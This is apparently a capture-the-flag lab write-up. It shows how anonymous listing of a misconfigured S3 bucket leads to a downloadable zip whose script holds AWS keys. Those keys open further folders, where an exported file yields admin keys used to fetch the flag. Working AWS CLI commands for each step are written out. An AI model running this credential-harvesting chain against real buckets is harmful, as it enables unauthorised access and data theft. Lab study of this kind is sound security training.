`dev.huge-logistics.com`

Inspect webpage to find the s3 bucket:
	`http://s3.amazonaws.com/dev.huge-logistics.com`

We can manually traverse these buckets, but we will get `AccessDenied`. Instead, try the `aws` cli:
```bash
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
	                       PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 10:00:47       5347 index.html
```

Most of these also result in `AccessDenied` except for `shared/` which has a `zip` file we can download:
```bash
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
unzip hl_migration_project.zip
```

This zip has `migrate_secrets.ps1` which contains AWS access key, secret key, and region. We use those to configure our `aws` cli and then `get-caller-identity`
```bash
head migrate_secrets.ps1
aws configure --profile pam
aws sts get-caller-identity --profile pam
```

We could also get the region with:
```bash
curl -I https://s3.amazonaws.com/dev.huge-logistics.com/
```

Now we can enumerate those folders more and download them:
```bash
aws s3 ls s3://dev.huge-logistics.com/migration-files/ --profile pam
aws s3 cp s3://dev.huge-logistics.com/migration-files/ . --recursive --profile pam
```

The `test-export.xml` has `AWS IT Admin` AWS keys. Configure them to a new profile and authenticate to that `/admin` folder:
```bash
strings test-export.xml
aws configure --profile admin
aws sts get-caller-identity --profile admin
aws s3 ls s3://dev.huge-logistics.com/ --profile admin
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile admin
```

![[Pasted image 20260603145519.png]]
